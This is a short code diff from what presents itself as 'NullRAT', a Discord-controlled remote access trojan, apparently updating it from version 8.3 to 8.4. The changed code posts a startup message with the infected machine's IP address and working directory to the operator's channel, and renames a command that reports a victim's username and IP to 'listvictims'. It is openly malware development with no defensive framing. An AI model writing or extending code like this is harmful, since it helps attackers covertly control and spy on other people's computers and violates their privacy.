@@ -17,12 +17,12 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v8.3 started on {IP()}\nCurrently present in {original_dir}")
+        embed=Embed(title = f"NullRAT v8.4 started on {IP()}", description=f"Currently present in {original_dir}")
     )
 
 # Intelligence Gathering #
-@client.slash_command(description="Finds the IP address of victims")
-async def getip(ctx):
+@client.slash_command(description="Lists the IP address of all victims")
+async def listvictims(ctx):
     await ctx.channel.send(
         embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
     )
